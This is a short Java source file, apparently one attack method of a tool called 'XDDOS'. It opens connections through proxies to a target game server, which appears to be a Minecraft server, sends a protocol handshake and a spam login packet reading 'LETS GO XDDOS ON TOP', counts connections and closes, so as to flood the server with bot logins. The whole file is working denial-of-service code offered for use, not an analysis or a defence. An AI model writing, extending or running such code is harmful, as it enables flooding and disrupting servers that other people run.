package XD.XDDOS.methods;

import XD.XDDOS.Main;
import XD.XDDOS.NettyBootstrap;
import XD.XDDOS.ProxyLoader;
import XD.XDDOS.utils.Handshake;
import XD.XDDOS.utils.LoginRequest;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;



public class XDSPAM
  implements Method
{
  private Handshake handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
  private byte[] bytes = this.handshake.getWrappedPacket();

  
  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    channel.writeAndFlush(Unpooled.buffer().writeBytes(this.bytes));
    channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest("\n\nLETS GO XDDOS ON TOP\n\n")).getWrappedPacket()));
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
    channel.close();
  }
}
